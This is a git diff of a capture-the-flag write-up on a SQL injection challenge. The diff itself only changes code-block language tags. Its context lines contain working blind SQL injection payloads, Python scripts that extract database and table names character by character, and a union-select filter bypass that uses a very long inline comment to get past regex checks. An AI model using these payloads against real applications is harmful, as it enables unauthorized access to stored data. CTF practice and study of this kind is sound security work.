@@ -1,7 +1,7 @@
 # Description:
 Super tough & Great SQL Injection Challenge which i personally loved it as i learned a ton through this challenge. We have a form validating user id's and source code is given.
 
-```css
+```php
 <?php 
 
 require_once('dbconnect.php');
@@ -92,7 +92,7 @@ Another hurdle here is MySQL is case insensitive language and like operator also
 Payload is as 
 ``2 && ascii(substr(database(),{},10))=ascii("{}")`` 
 
-```css
+```python
 import requests
 from string import printable
 
@@ -172,7 +172,7 @@ Hello guest
 
 same way we can find other table name lengths. I only found 2 tables of which ``5 & 25`` lengths. We can easily guess first table name as ``users`` which is of `5` char length.
 
-```css
+```python
 def dump_tablenames():
 	result=''
 	j=1
@@ -241,14 +241,14 @@ php >
 ```
 This is how it is in action. Now using this behavior we can easily bypass union select regex check.
 
-```css
+```python
 def union_bypass():
   payload = 'union/*'+'a'*1000000+'*/select 1,2,3-- -'
 	r = requests.post(url,headers={'Content-Type':'application/x-www-form-urlencoded'},data={'id':'-2 {}'.format(payload)},proxies={'http':'http://127.0.0.1:8080'})
 	print r.text
   ```
 Output is 
-```css
+```html
 <br><br><br><br><center>
 Security Check!!! Please enter your ID to prove who are you !!!:
 <form action="index.php" method="POST">
@@ -262,7 +262,7 @@ Hello 2
 
 Now we can print flag without knowing column_name (That's the beauty if we have Union)
 
-```css
+```python
 def union_bypass():
 	#payload = 'union/*'+'a'*1000000+'*/select 1,2,3-- -'
 	payload='union/*'+'a'*1000000+'*/select 1,(select b from (select 1 as a, 2 as b union/*'+'a'*1000000+'*/select * from Th1z_Fack1n_Fl4444g_Tabl3) bbb limit 1,1),3-- -'
